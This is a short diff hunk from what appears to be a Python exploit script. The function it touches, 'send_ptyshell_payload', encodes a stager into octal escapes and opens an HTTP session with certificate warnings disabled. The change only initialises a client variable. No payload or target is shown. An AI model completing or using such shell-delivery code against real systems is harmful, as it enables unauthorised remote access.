@@ -27,6 +27,7 @@ def send_ptyshell_payload():
         encoded_stager += "\\\\%03d" %(int(oct(ord(c))))
     time.sleep(1)
     
+    client = None
     try:
         urllib3.disable_warnings()
         client = requests.session()
